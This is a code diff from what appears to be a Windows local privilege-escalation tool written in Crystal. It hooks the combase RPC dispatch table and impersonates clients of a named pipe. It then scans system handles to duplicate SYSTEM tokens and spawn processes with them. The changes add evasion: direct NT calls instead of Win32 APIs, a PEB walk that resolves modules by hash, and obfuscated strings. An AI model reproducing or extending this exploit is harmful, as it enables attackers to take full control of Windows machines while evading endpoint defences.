+  def self.create_process_with_token_w(token : Pointer(Void), logon_flags : UInt32,
+                                        app : Pointer(UInt16), cmdline : Pointer(UInt16),
+                                        creation : UInt32, env : Pointer(Void),
+                                        dir : Pointer(UInt16), si : Pointer(Void),
+                                        pi : Pointer(Void)) : Int32
+    DynCall.call9(@@create_proc_token_w,
+      token.address.to_u64, logon_flags.to_u64,
+      app.address.to_u64, cmdline.address.to_u64,
+      creation.to_u64, env.address.to_u64,
+      dir.address.to_u64, si.address.to_u64,
+      pi.address.to_u64).to_i32!
+  end
+
+  def self.create_process_as_user_w(token : Pointer(Void), app : Pointer(UInt16),
+                                     cmdline : Pointer(UInt16), proc_attr : Pointer(Void),
+                                     thread_attr : Pointer(Void), inherit : Int32,
+                                     creation : UInt32, env : Pointer(Void),
+                                     dir : Pointer(UInt16), si : Pointer(Void),
+                                     pi : Pointer(Void)) : Int32
+    DynCall.call11(@@create_proc_user_w,
+      token.address.to_u64, app.address.to_u64,
+      cmdline.address.to_u64, proc_attr.address.to_u64,
+      thread_attr.address.to_u64, inherit.to_u64,
+      creation.to_u64, env.address.to_u64,
+      dir.address.to_u64, si.address.to_u64,
+      pi.address.to_u64).to_i32!
+  end
+end
+
+
+# ─────────────── Lib blocks (non-stdlib Win32 only) ─────
+@[Link("kernel32")]
+lib WinExtra
+  fun GlobalAlloc(uFlags : UInt32, dwBytes : UInt64) : Void*
+  fun GlobalLock(hMem : Void*) : Void*
+  fun GlobalUnlock(hMem : Void*) : Int32
+  fun CreatePipe(hReadPipe : Void**, hWritePipe : Void**, lpPipeAttributes : Void*, nSize : UInt32) : Int32
+  fun SetHandleInformation(hObject : Void*, dwMask : UInt32, dwFlags : UInt32) : Int32
+  fun CreateThread(lpThreadAttributes : Void*, dwStackSize : UInt64,
+    lpStartAddress : Pointer(Void) -> UInt32, lpParameter : Void*,
+    dwCreationFlags : UInt32, lpThreadId : UInt32*) : Void*
+  fun VirtualProtect(lpAddress : Void*, dwSize : UInt64, flNewProtect : UInt32, lpflOldProtect : UInt32*) : Int32
+  fun GetStdHandle(nStdHandle : UInt32) : Void*
+  fun MultiByteToWideChar(codePage : UInt32, dwFlags : UInt32, lpMB : UInt8*, cbMB : Int32, lpWC : UInt16*, cchWC : Int32) : Int32
+  fun WriteConsoleW(hOut : Void*, lpBuf : UInt16*, nChars : UInt32, lpWritten : UInt32*, lpReserved : Void*) : Int32
 end
 
 lib LibGC
@@ -77,18 +763,6 @@ lib LibGC
   fun GC_register_my_thread(sb : GcStackBase*) : Int32
   fun GC_unregister_my_thread() : Void
   fun GC_get_stack_base(sb : GcStackBase*) : Int32
-end
-
-@[Link("ntdll")]
-lib Nt
-  fun NtQuerySystemInformation(info_class : UInt32, info : Void*,
-    info_length : UInt32, return_length : UInt32*) : UInt32
-end
-
-@[Link("psapi")]
-lib Ps
-  fun GetModuleInformation(process : Void*, mod : Void*, info : Void*, size : UInt32) : Int32
-  fun EnumProcesses(pids : UInt32*, size : UInt32, needed : UInt32*) : Int32
 end
 
 @[Link("ole32")]
@@ -104,8 +778,9 @@ end
 
 
 # ─────────────── Constants ──────────────────────────────
+CURRENT_PROCESS = Pointer(Void).new(UInt64::MAX)
+CURRENT_THREAD  = Pointer(Void).new(UInt64::MAX &- 1)
 INVALID_HANDLE_VALUE = Pointer(Void).new(UInt64::MAX)
-INFINITE_WAIT        = 0xFFFFFFFF_u32
 
 PIPE_ACCESS_DUPLEX       = 0x03_u32
 PIPE_TYPE_BYTE           = 0x00_u32
@@ -165,6 +840,30 @@ ORCB_GUID_BYTES = Bytes[
 ]
 
 
+# ─────────────── NT Structs for syscalls ────────────────
+struct ObjectAttributesSC
+  property length : UInt32 = 48_u32
+  property _pad1 : UInt32 = 0_u32
+  property root_directory : Pointer(Void) = Pointer(Void).null
+  property object_name : Pointer(Void) = Pointer(Void).null
+  property attributes : UInt32 = 0_u32
+  property _pad2 : UInt32 = 0_u32
+  property security_descriptor : Pointer(Void) = Pointer(Void).null
+  property security_qos : Pointer(Void) = Pointer(Void).null
+
+  def initialize
+  end
+end
+
+struct ClientIdSC
+  property unique_process : UInt64 = 0_u64
+  property unique_thread : UInt64 = 0_u64
+
+  def initialize(@unique_process = 0_u64, @unique_thread = 0_u64)
+  end
+end
+
+
 # ─────────────── Structs ────────────────────────────────
 struct SecurityAttributesCR
   property n_length : UInt32 = 0_u32
@@ -172,15 +871,6 @@ struct SecurityAttributesCR
   property b_inherit_handle : Int32 = 0_i32
 
   def initialize(@n_length = 0_u32, @lp_security_descriptor = Pointer(Void).null, @b_inherit_handle = 0_i32)
-  end
-end
-
-struct ModuleInfoCR
-  property base_of_dll : Pointer(Void) = Pointer(Void).null
-  property size_of_image : UInt32 = 0_u32
-  property entry_point : Pointer(Void) = Pointer(Void).null
-
-  def initialize
   end
 end
 
@@ -451,53 +1141,74 @@ def read_wide_string(ptr : Pointer(UInt16)) : String
   end
 end
 
+def sid_to_string(sid : Pointer(Void)) : String?
+  return nil if sid.null?
+  ptr = sid.as(Pointer(UInt8))
+  revision = ptr[0]
+  sub_count = ptr[1]
+  return nil if sub_count == 0
+
+  auth_bytes = ptr + 2
+  authority = (auth_bytes[0].to_u64 << 40) | (auth_bytes[1].to_u64 << 32) |
+              (auth_bytes[2].to_u64 << 24) | (auth_bytes[3].to_u64 << 16) |
+              (auth_bytes[4].to_u64 << 8) | auth_bytes[5].to_u64
+
+  String.build do |s|
+    s << "S-" << revision << "-" << authority
+    sub_base = (ptr + 8).as(Pointer(UInt32))
+    sub_count.times do |i|
+      s << "-" << sub_base[i]
+    end
+  end
+end
+
 def get_token_sid(token : Pointer(Void)) : String?
   buf_len = 0_u32
-  LibC.GetTokenInformation(token, TOKEN_USER_CLASS, Pointer(Void).null, 0_u32, pointerof(buf_len))
+  s1 = SysState.nt_query_information_token(token, TOKEN_USER_CLASS.to_u32,
+    Pointer(Void).null, 0_u32, pointerof(buf_len))
+  dbg obf("[sid] probe status=0x") + s1.unsafe_as(UInt32).to_s(16) + " buf_len=" + buf_len.to_s
   return nil if buf_len == 0
 
   buf = Bytes.new(buf_len)
-  return nil unless LibC.GetTokenInformation(
-    token, TOKEN_USER_CLASS, buf.to_unsafe.as(Pointer(Void)),
-    buf_len, pointerof(buf_len)) != 0
+  status = SysState.nt_query_information_token(token, TOKEN_USER_CLASS.to_u32,
+    buf.to_unsafe.as(Pointer(Void)), buf_len, pointerof(buf_len))
+  dbg obf("[sid] query status=0x") + status.unsafe_as(UInt32).to_s(16)
+  return nil if status < 0
 
   sid_ptr = Pointer(Pointer(Void)).new(buf.to_unsafe.address).value
-  str_sid = Pointer(UInt16).null
-  if LibC.ConvertSidToStringSidW(sid_ptr.as(Pointer(LibC::SID)), pointerof(str_sid).as(Pointer(LibC::LPWSTR))) != 0
-    result = read_wide_string(str_sid)
-    LibC.LocalFree(str_sid.as(Pointer(Void)))
-    return result
-  end
-  nil
+  dbg obf("[sid] sid_ptr=0x") + sid_ptr.address.to_s(16)
+  result = sid_to_string(sid_ptr)
+  dbg obf("[sid] result=") + (result || "nil")
+  result
 end
 
 def get_integrity_level(token : Pointer(Void)) : UInt32
   buf_len = 0_u32
-  LibC.GetTokenInformation(token, TOKEN_INTEGRITY_LEVEL_CLASS, Pointer(Void).null, 0_u32, pointerof(buf_len))
+  SysState.nt_query_information_token(token, TOKEN_INTEGRITY_LEVEL_CLASS.to_u32,
+    Pointer(Void).null, 0_u32, pointerof(buf_len))
   return 0_u32 if buf_len == 0
 
   buf = Bytes.new(buf_len)
-  return 0_u32 unless LibC.GetTokenInformation(
-    token, TOKEN_INTEGRITY_LEVEL_CLASS, buf.to_unsafe.as(Pointer(Void)),
-    buf_len, pointerof(buf_len)) != 0
+  status = SysState.nt_query_information_token(token, TOKEN_INTEGRITY_LEVEL_CLASS.to_u32,
+    buf.to_unsafe.as(Pointer(Void)), buf_len, pointerof(buf_len))
+  return 0_u32 if status < 0
 
   sid_ptr = Pointer(Pointer(Void)).new(buf.to_unsafe.address).value
   return 0_u32 if sid_ptr.null?
 
-  sub_count_ptr = LibC.GetSidSubAuthorityCount(sid_ptr)
-  sub_count = sub_count_ptr.value
-  rid_ptr = LibC.GetSidSubAuthority(sid_ptr, sub_count.to_u32 - 1)
-  rid_ptr.value
+  ptr = sid_ptr.as(Pointer(UInt8))
+  sub_count = ptr[1]
+  return 0_u32 if sub_count == 0
+  sub_base = (ptr + 8).as(Pointer(UInt32))
+  sub_base[sub_count.to_i32 - 1]
 end
 
 def get_impersonation_level(token : Pointer(Void)) : Int32
   level = 0_u32
   buf_len = sizeof(UInt32).to_u32
-  if LibC.GetTokenInformation(
-      token, TOKEN_IMPERSONATION_LV_CLASS,
-      pointerof(level).as(Pointer(Void)), buf_len, pointerof(buf_len)) != 0
-    return level.to_i32
-  end
+  status = SysState.nt_query_information_token(token, TOKEN_IMPERSONATION_LV_CLASS.to_u32,
+    pointerof(level).as(Pointer(Void)), buf_len, pointerof(buf_len))
+  return level.to_i32 if status >= 0
   -1
 end
 
@@ -506,36 +1217,45 @@ def query_system_handles : {Pointer(Void), UInt32}?
   buf = Pointer(UInt8).malloc(buf_size).as(Pointer(Void))
   ret_len = 0_u32
 
-  status = Nt.NtQuerySystemInformation(
+  status = SysState.nt_query_system_information(
     SYSTEM_EXTENDED_HANDLE_INFORMATION, buf, buf_size, pointerof(ret_len))
+  dbg obf("[qsh] initial status=0x") + status.to_s(16) + " ret_len=" + ret_len.to_s + " buf_size=" + buf_size.to_s
   while status == STATUS_INFO_LENGTH_MISMATCH
     buf_size *= 2
     buf = Pointer(UInt8).malloc(buf_size).as(Pointer(Void))
-    status = Nt.NtQuerySystemInformation(
+    status = SysState.nt_query_system_information(
       SYSTEM_EXTENDED_HANDLE_INFORMATION, buf, buf_size, pointerof(ret_len))
+    dbg obf("[qsh] retry status=0x") + status.to_s(16) + " ret_len=" + ret_len.to_s + " buf_size=" + buf_size.to_s
   end
 
   if status != STATUS_SUCCESS
+    dbg obf("[qsh] FAILED status=0x") + status.to_s(16)
     return nil
   end
+  dbg obf("[qsh] OK handles_buf_size=") + ret_len.to_s
   {buf, ret_len}
 end
 
 def detect_token_object_type : Int32
   my_token = Pointer(Void).null
-  ok = LibC.OpenThreadToken(
-    LibC.GetCurrentThread, TOKEN_QUERY, 1, pointerof(my_token))
-  if ok == 0 || my_token.null?
-    ok = LibC.OpenProcessToken(
-      LibC.GetCurrentProcess, TOKEN_QUERY, pointerof(my_token))
+  status = SysState.nt_open_thread_token(CURRENT_THREAD, TOKEN_QUERY, 1, pointerof(my_token))
+  dbg obf("[dtot] thread_token status=0x") + status.unsafe_as(UInt32).to_s(16) + " tok=0x" + my_token.address.to_s(16)
+  if status < 0 || my_token.null?
+    status = SysState.nt_open_process_token(CURRENT_PROCESS, TOKEN_QUERY, pointerof(my_token))
+    dbg obf("[dtot] proc_token status=0x") + status.unsafe_as(UInt32).to_s(16) + " tok=0x" + my_token.address.to_s(16)
   end
-  return -1 if my_token.null?
+  if my_token.null?
+    dbg obf("[dtot] no token")
+    return -1
+  end
 
-  my_pid = LibC.GetCurrentProcessId.to_u64
+  my_pid = PEWalk.get_current_pid.to_u64
+  dbg obf("[dtot] pid=") + my_pid.to_s + " token_handle=0x" + my_token.address.to_s(16)
 
   result = query_system_handles
   unless result
-    LibC.CloseHandle(my_token)
+    dbg obf("[dtot] query_system_handles FAILED")
+    SysState.nt_close(my_token)
     return -1
   end
   buf, _ = result
@@ -543,18 +1263,32 @@ def detect_token_object_type : Int32
   num_handles = Pointer(UInt64).new(buf.address).value
   entry_offset = sizeof(UInt64) * 2
   entry_size = sizeof(He)
+  dbg obf("[dtot] num_handles=") + num_handles.to_s + " entry_size=" + entry_size.to_s
 
   token_type = -1_i32
+  pid_matches = 0
+  first_pid_entry_dumped = false
   num_handles.times do |i|
     addr = buf.address + entry_offset + i * entry_size
     entry = Pointer(He).new(addr).value
-    if entry.process_id == my_pid && entry.handle_value == my_token.address.to_u64
-      token_type = entry.object_type.to_i32
-      break
+    if entry.process_id == my_pid
+      pid_matches += 1
+      unless first_pid_entry_dumped
+        dbg obf("[dtot] sample pid_entry: hv=0x") + entry.handle_value.to_s(16) +
+            " ot=" + entry.object_type.to_s + " ga=0x" + entry.granted_access.to_s(16)
+        first_pid_entry_dumped = true
+      end
+      if entry.handle_value == my_token.address.to_u64
+        token_type = entry.object_type.to_i32
+        dbg obf("[dtot] FOUND type=") + token_type.to_s + " at i=" + i.to_s
+        break
+      end
     end
   end
 
-  LibC.CloseHandle(my_token)
+  dbg obf("[dtot] pid_matches=") + pid_matches.to_s
+  SysState.nt_close(my_token)
+  dbg obf("[dtot] result=") + token_type.to_s
   token_type
 end
 
@@ -563,8 +1297,8 @@ def find_system_token(log : Array(String)? = nil) : Pointer(Void)?
 
   token_type = detect_token_object_type
   if token_type < 0
-    log.try &.<< obf("[-] not found")
-    return nil
+    dbg obf("[fst] detect failed, fallback type=5")
+    token_type = 5
   end
 
   result = query_system_handles
@@ -577,12 +1311,21 @@ def find_system_token(log : Array(String)? = nil) : Pointer(Void)?
   num_handles = Pointer(UInt64).new(buf.address).value
   entry_offset = sizeof(UInt64) * 2
   entry_size = sizeof(He)
-  local_proc = LibC.GetCurrentProcess
 
   last_pid = 0_u64
   proc_handle = Pointer(Void).null
   found_token : Pointer(Void)? = nil
   system_sid = obf("S-1-5-18")
+
+  oa = ObjectAttributesSC.new
+  my_pid = PEWalk.get_current_pid.to_u64
+
+  token_matches = 0
+  dup_ok = 0
+  sid_system = 0
+  proc_open_fail = 0
+
+  dbg obf("[fst] using token_type=") + token_type.to_s + " num_handles=" + num_handles.to_s
 
   num_handles.times do |i|
     addr = buf.address + entry_offset + i * entry_size
@@ -590,55 +1333,77 @@ def find_system_token(log : Array(String)? = nil) : Pointer(Void)?
 
     next if entry.object_type.to_i32 != token_type
     next if entry.granted_access == 0x0012019f_u32
+    token_matches += 1
 
     h_pid = entry.process_id
     if h_pid != last_pid
-      LibC.CloseHandle(proc_handle) unless proc_handle.null?
+      SysState.nt_close(proc_handle) unless proc_handle.null?
       proc_handle = Pointer(Void).null
-      proc_handle = LibC.OpenProcess(
-        PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, 0, h_pid.to_u32)
+
+      cid = ClientIdSC.new(h_pid)
+      SysState.nt_open_process(pointerof(proc_handle),
+        PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
+        pointerof(oa).as(Pointer(Void)), pointerof(cid).as(Pointer(Void)))
+
       if proc_handle.null?
-        proc_handle = LibC.OpenProcess(
-          PROCESS_DUP_HANDLE | PROCESS_QUERY_LIMITED_INFORMATION, 0, h_pid.to_u32)
+        SysState.nt_open_process(pointerof(proc_handle),
+          PROCESS_DUP_HANDLE | PROCESS_QUERY_LIMITED_INFORMATION,
+          pointerof(oa).as(Pointer(Void)), pointerof(cid).as(Pointer(Void)))
       end
       last_pid = h_pid
     end
 
-    next if proc_handle.null?
+    if proc_handle.null?
+      proc_open_fail += 1
+      next
+    end
 
     dup_token = Pointer(Void).null
-    next if LibC.DuplicateHandle(
+    status = SysState.nt_duplicate_object(
       proc_handle, Pointer(Void).new(entry.handle_value),
-      local_proc, pointerof(dup_token),
-      0_u32, 0, DUPLICATE_SAME_ACCESS) == 0
+      CURRENT_PROCESS, pointerof(dup_token),
+      0_u32, 0_u32, DUPLICATE_SAME_ACCESS)
+    if status < 0
+      next
+    end
+    dup_ok += 1
 
     sid = get_token_sid(dup_token)
-    unless sid == system_sid
-      LibC.CloseHandle(dup_token)
+    dbg obf("[fst] dup#") + dup_ok.to_s + " pid=" + h_pid.to_s + " sid=" + (sid || "nil") if dup_ok <= 5
+    if sid == system_sid
+      sid_system += 1
+    else
+      SysState.nt_close(dup_token)
       next
     end
 
     imp_level = get_impersonation_level(dup_token)
     integrity = get_integrity_level(dup_token)
+    dbg obf("[fst] SYSTEM pid=") + h_pid.to_s + " il=" + imp_level.to_s + " integ=0x" + integrity.to_s(16)
 
     if imp_level >= 2 && integrity >= 0x4000
       new_token = Pointer(Void).null
-      if LibC.DuplicateTokenEx(
-          dup_token, TOKEN_ELEVATION, Pointer(Void).null,
-          SECURITY_IMPERSONATION, TOKEN_IMPERSONATION_TYPE,
-          pointerof(new_token)) != 0
+      dup_oa = ObjectAttributesSC.new
+      status = SysState.nt_duplicate_token(
+        dup_token, TOKEN_ELEVATION,
+        pointerof(dup_oa).as(Pointer(Void)),
+        SECURITY_IMPERSONATION.to_u32, TOKEN_IMPERSONATION_TYPE.to_u32,
+        pointerof(new_token))
+      dbg obf("[fst] dup_token status=0x") + status.unsafe_as(UInt32).to_s(16) + " new=0x" + new_token.address.to_s(16)
+      if status >= 0
         log.try { |l| l << obf("[*] P:") + h_pid.to_s + obf(" H:0x") + entry.handle_value.to_s(16) + obf(" OK") }
-        LibC.CloseHandle(dup_token)
+        SysState.nt_close(dup_token)
         found_token = new_token
         break
       end
     end
 
-    LibC.CloseHandle(dup_token)
+    SysState.nt_close(dup_token)
   end
 
-  LibC.CloseHandle(proc_handle) unless proc_handle.null?
+  SysState.nt_close(proc_handle) unless proc_handle.null?
 
+  dbg obf("[fst] token_matches=") + token_matches.to_s + " dup_ok=" + dup_ok.to_s + " sid_system=" + sid_system.to_s + " proc_fail=" + proc_open_fail.to_s
   unless found_token
     log.try &.<< obf("[-] not found")
   end
@@ -652,20 +1417,22 @@ def create_process_read_output(token_handle : Pointer(Void), command_line : Stri
 
   stdout_read = Pointer(Void).null
   stdout_write = Pointer(Void).null
-  if LibC.CreatePipe(pointerof(stdout_read), pointerof(stdout_write),
+  if WinExtra.CreatePipe(pointerof(stdout_read), pointerof(stdout_write),
       pointerof(sa).as(Pointer(Void)), 8196_u32) == 0
     dbg obf("[!] pipe err:") + LibC.GetLastError.to_s
     return
   end
 
-  LibC.SetHandleInformation(stdout_read, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)
-  LibC.SetHandleInformation(stdout_write, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)
+  WinExtra.SetHandleInformation(stdout_read, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)
+  WinExtra.SetHandleInformation(stdout_write, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)
 
   primary_token = Pointer(Void).null
-  has_primary = LibC.DuplicateTokenEx(
-    token_handle, TOKEN_ELEVATION, Pointer(Void).null,
-    SECURITY_IMPERSONATION, TOKEN_PRIMARY,
-    pointerof(primary_token)) != 0
+  dup_oa = ObjectAttributesSC.new
+  has_primary = SysState.nt_duplicate_token(
+    token_handle, TOKEN_ELEVATION,
+    pointerof(dup_oa).as(Pointer(Void)),
+    SECURITY_IMPERSONATION.to_u32, TOKEN_PRIMARY.to_u32,
+    pointerof(primary_token)) >= 0
   primary_token = token_handle unless has_primary
 
   si = StartupInfoW.new
@@ -677,12 +1444,12 @@ def create_process_read_output(token_handle : Pointer(Void), command_line : Stri
   cmdline_w = command_line.to_utf16
   created = false
 
-  if LibC.CreateProcessWithTokenW(
+  if SysState.create_process_with_token_w(
       primary_token, 0_u32, Pointer(UInt16).null, cmdline_w.to_unsafe,
       CREATE_NO_WINDOW, Pointer(Void).null, Pointer(UInt16).null,
       pointerof(si).as(Pointer(Void)), pointerof(pi).as(Pointer(Void))) != 0
     created = true
-  elsif LibC.CreateProcessAsUserW(
+  elsif SysState.create_process_as_user_w(
       primary_token, Pointer(UInt16).null, cmdline_w.to_unsafe,
       Pointer(Void).null, Pointer(Void).null, 1,
       CREATE_NO_WINDOW, Pointer(Void).null, Pointer(UInt16).null,
@@ -690,38 +1457,45 @@ def create_process_read_output(token_handle : Pointer(Void), command_line : Stri
     created = true
   end
 
-  LibC.CloseHandle(primary_token) if has_primary
+  SysState.nt_close(primary_token) if has_primary
 
   if created
     dbg obf("[*] pid ") + pi.dw_process_id.to_s
-    LibC.CloseHandle(stdout_write)
+    SysState.nt_close(stdout_write)
     stdout_write = Pointer(Void).null
 
     buf = Bytes.new(4096)
     bytes_avail = 0_u32
 
+    h_stdout = WinExtra.GetStdHandle(0xFFFFFFF5_u32)
+    wide_buf = Slice(UInt16).new(4096)
     loop do
-      break unless LibC.PeekNamedPipe(
+      break unless SysState.peek_named_pipe(
         stdout_read, Pointer(UInt8).null, 0_u32,
         Pointer(UInt32).null, pointerof(bytes_avail), Pointer(UInt32).null) != 0
       if bytes_avail > 0
         bytes_read = 0_u32
         if LibC.ReadFile(stdout_read, buf.to_unsafe.as(Pointer(Void)), 4096_u32,
             pointerof(bytes_read), Pointer(LibC::OVERLAPPED).null) != 0
-          STDOUT.write(buf[0, bytes_read])
-          STDOUT.flush
+          wide_len = WinExtra.MultiByteToWideChar(1_u32, 0_u32, buf.to_unsafe, bytes_read.to_i32, wide_buf.to_unsafe, 4096)
+          if wide_len > 0
+            written = 0_u32
+            WinExtra.WriteConsoleW(h_stdout, wide_buf.to_unsafe, wide_len.to_u32, pointerof(written), Pointer(Void).null)
+          end
         end
       end
     end
 
-    LibC.CloseHandle(pi.h_process)
-    LibC.CloseHandle(pi.h_thread)
+    timeout = -1_i64
+    SysState.nt_wait_for_single_object(pi.h_process, 0, pointerof(timeout).as(Pointer(Void)))
+    SysState.nt_close(pi.h_process)
+    SysState.nt_close(pi.h_thread)
   else
     dbg obf("[!] exec err:") + LibC.GetLastError.to_s
   end
 
-  LibC.CloseHandle(stdout_write) unless stdout_write.null?
-  LibC.CloseHandle(stdout_read)
+  SysState.nt_close(stdout_write) unless stdout_write.null?
+  SysState.nt_close(stdout_read)
 end
 
 
@@ -739,7 +1513,7 @@ module HookState
     endpoints.each { |ep| entries_size += ep.size + 1 }
 
     memory_size = (entries_size * 2 + 10).to_u64
-    pdsa = LibC.GlobalAlloc(0x0040_u32, memory_size)
+    pdsa = WinExtra.GlobalAlloc(0x0040_u32, memory_size)
     return -1 if pdsa.null?
 
     base = pdsa.address
@@ -843,20 +1617,14 @@ class MyContext
   end
 
   private def init_context
-    combase_name = obf("combase.dll").to_utf16
-    h_combase = LibC.GetModuleHandleW(combase_name.to_unsafe)
-    return if h_combase.null?
+    combase_base, combase_size = PEWalk.ldr_module(0x56777929_u32)
+    return if combase_base == 0
 
-    @combase_module = h_combase.address
+    @combase_module = combase_base
+    module_size = combase_size.to_i32
 
-    mod_info = ModuleInfoCR.new
-    Ps.GetModuleInformation(
-      LibC.GetCurrentProcess, h_combase,
-      pointerof(mod_info).as(Pointer(Void)), sizeof(ModuleInfoCR).to_u32)
-
-    module_size = mod_info.size_of_image
     dll_content = Bytes.new(module_size)
-    dll_content.to_unsafe.copy_from(h_combase.as(Pointer(UInt8)), module_size)
+    dll_content.to_unsafe.copy_from(Pointer(UInt8).new(combase_base), module_size)
 
     rsi_size = sizeof(Ri).to_u32
     pattern_io = IO::Memory.new
@@ -900,15 +1668,27 @@ class MyContext
     hook_ptr = HookState.get_hook_pointer(@use_protseq_param_count)
 
     old_protect = 0_u32
-    table_size = 8_u64 * @dispatch_table.size
-    LibC.VirtualProtect(
-      Pointer(Void).new(@dispatch_table_ptr), table_size,
-      PAGE_READWRITE, pointerof(old_protect))
+    table_size = (8_u64 * @dispatch_table.size)
+    base_addr = Pointer(Void).new(@dispatch_table_ptr)
+    region = table_size
+
+    status = SysState.nt_protect_virtual_memory(
+      CURRENT_PROCESS, pointerof(base_addr),
+      pointerof(region), PAGE_READWRITE,
+      pointerof(old_protect))
+
+    dbg obf("[*] vp:0x") + status.unsafe_as(UInt32).to_s(16) + obf(" old:0x") + old_protect.to_s(16)
+
+    if status < 0
+      dbg obf("[!] vp fail, fallback")
+      WinExtra.VirtualProtect(Pointer(Void).new(@dispatch_table_ptr),
+        table_size, PAGE_READWRITE, pointerof(old_protect))
+    end
 
     Pointer(Pointer(Void)).new(@dispatch_table_ptr).value = hook_ptr
 
     @is_hooked = true
-    dbg obf("[*] hooked")
+    dbg1 obf("[*] hooked")
   end
 
   private def log(msg : String)
@@ -919,19 +1699,25 @@ class MyContext
     sddl = obf("D:(A;OICI;GA;;;WD)").to_utf16
     sec_desc = Pointer(Void).null
     sec_desc_size = 0_u32
-    LibC.ConvertStringSecurityDescriptorToSecurityDescriptorW(
-      sddl.to_unsafe, 1_u32, pointerof(sec_desc), pointerof(sec_desc_size))
+    dbg obf("[pipe] convert_sd addr=0x") + SysState.dbg_convert_sd.to_s(16)
+    dbg obf("[pipe] sddl ptr=0x") + sddl.to_unsafe.address.to_s(16) + " len=" + sddl.size.to_s
+    ret = SysState.convert_sd_w(sddl.to_unsafe, 1_u32, pointerof(sec_desc), pointerof(sec_desc_size))
+    dbg obf("[pipe] convert_sd_w returned ") + ret.to_s
 
     sa = SecurityAttributesCR.new(sizeof(SecurityAttributesCR).to_u32, sec_desc, 0)
+    dbg obf("[pipe] sa ok, sec_desc=0x") + sec_desc.address.to_s(16)
 
     pipe_name_w = @server_pipe.to_utf16
-    pipe_handle = LibC.CreateNamedPipeW(
+    dbg obf("[pipe] cnpw=0x") + SysState.dbg_create_named_pipe_w.to_s(16)
+    dbg obf("[pipe] calling CreateNamedPipeW")
+    pipe_handle = SysState.create_named_pipe_w(
       pipe_name_w.to_unsafe,
       PIPE_ACCESS_DUPLEX,
       PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
       PIPE_UNLIMITED_INSTANCES,
       521_u32, 0_u32, 123_u32,
       pointerof(sa).as(Pointer(Void)))
+    dbg obf("[pipe] handle=0x") + pipe_handle.address.to_s(16)
 
     log obf("[*] listening ") + @server_pipe
 
@@ -940,26 +1726,31 @@ class MyContext
       return
     end
 
-    is_connect = LibC.ConnectNamedPipe(pipe_handle, Pointer(Void).null)
+    dbg obf("[pipe] calling ConnectNamedPipe")
+    is_connect = SysState.connect_named_pipe(pipe_handle, Pointer(Void).null)
+    dbg obf("[pipe] connect=") + is_connect.to_s
     last_err = LibC.GetLastError
 
     if (is_connect != 0 || last_err == ERROR_PIPE_CONNECTED) && @is_started
       log obf("[*] connected")
 
-      if LibC.ImpersonateNamedPipeClient(pipe_handle) != 0
+      imp_ret = SysState.impersonate_named_pipe_client(pipe_handle)
+      dbg obf("[imp] impersonate ret=") + imp_ret.to_s
+      if imp_ret != 0
         imp_token = Pointer(Void).null
-        ok = LibC.OpenThreadToken(
-          LibC.GetCurrentThread,
+        status = SysState.nt_open_thread_token(
+          CURRENT_THREAD,
           TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
           1, pointerof(imp_token))
-        imp_token = Pointer(Void).null if ok == 0
+        dbg obf("[imp] open_thread_token status=0x") + status.unsafe_as(UInt32).to_s(16) + " tok=0x" + imp_token.address.to_s(16)
+        imp_token = Pointer(Void).null if status < 0
 
         current_sid = imp_token.null? ? "?" : (get_token_sid(imp_token) || "?")
         imp_level = imp_token.null? ? -1 : get_impersonation_level(imp_token)
 
         log obf("[*] sid:") + current_sid + obf(" il:") + imp_level.to_s
 
-        LibC.CloseHandle(imp_token) unless imp_token.null?
+        SysState.nt_close(imp_token) unless imp_token.null?
 
         system_token = find_system_token(@log)
         if system_token
@@ -969,7 +1760,7 @@ class MyContext
           log obf("[*] not found")
         end
 
-        LibC.RevertToSelf
+        SysState.revert_to_self
       else
         log obf("[!] err:") + LibC.GetLastError.to_s
       end
@@ -977,7 +1768,7 @@ class MyContext
       log obf("[!] conn err:") + is_connect.to_s + " " + last_err.to_s
     end
 
-    LibC.CloseHandle(pipe_handle)
+    SysState.nt_close(pipe_handle)
   end
 
   def start
@@ -987,22 +1778,21 @@ class MyContext
     @is_started = true
     PipeServerBridge.ctx = self
     tid = 0_u32
-    @thread_handle = LibC.CreateThread(
+    @thread_handle = WinExtra.CreateThread(
       Pointer(Void).null, 0_u64,
       PIPE_SERVER_THREAD_PROC,
       Pointer(Void).null,
       0_u32, pointerof(tid))
-    dbg obf("[*] started")
+    dbg1 obf("[*] started")
   end
 
   def join_pipe_thread
     unless @thread_handle.null?
-      LibC.WaitForSingleObject(@thread_handle, INFINITE_WAIT)
-      LibC.CloseHandle(@thread_handle)
+      timeout = -1_i64
+      SysState.nt_wait_for_single_object(@thread_handle, 0, pointerof(timeout).as(Pointer(Void)))
+      SysState.nt_close(@thread_handle)
     end
-    if Config.debug?
-      @log.each { |msg| puts msg }
-    end
+    @log.each { |msg| dbg1 msg }
     @log.clear
   end
 
@@ -1017,20 +1807,19 @@ class MyContext
     if @is_started
       @is_started = false
       begin
-        sa = SecurityAttributesCR.new(sizeof(SecurityAttributesCR).to_u32)
         pipe_name_w = @server_pipe.to_utf16
         pipe_client = LibC.CreateFileW(
           pipe_name_w.to_unsafe,
           0xC0000000_u32,
           0x03_u32,
-          pointerof(sa).as(Pointer(LibC::SECURITY_ATTRIBUTES)),
+          Pointer(LibC::SECURITY_ATTRIBUTES).null,
           3_u32,
           0_u32, Pointer(Void).null)
         if pipe_client != INVALID_HANDLE_VALUE
           data = StaticArray(UInt8, 1).new(0xAA_u8)
           written = 0_u32
           LibC.WriteFile(pipe_client, data.to_unsafe.as(Pointer(Void)), 1_u32, pointerof(written), Pointer(LibC::OVERLAPPED).null)
-          LibC.CloseHandle(pipe_client)
+          SysState.nt_close(pipe_client)
         end
       rescue
       end
@@ -1049,7 +1838,7 @@ def get_local_objref : ObjRef
   hr = Ole32.CreateStreamOnHGlobal(Pointer(Void).null, 1, pointerof(fake_obj))
   raise obf("stream err:0x") + hr.unsafe_as(UInt32).to_s(16) if hr < 0
 
-  hglobal = LibC.GlobalAlloc(0x0042_u32, 4096_u64)
+  hglobal = WinExtra.GlobalAlloc(0x0042_u32, 4096_u64)
   raise obf("alloc err") if hglobal.null?
 
   out_stream = Pointer(Void).null
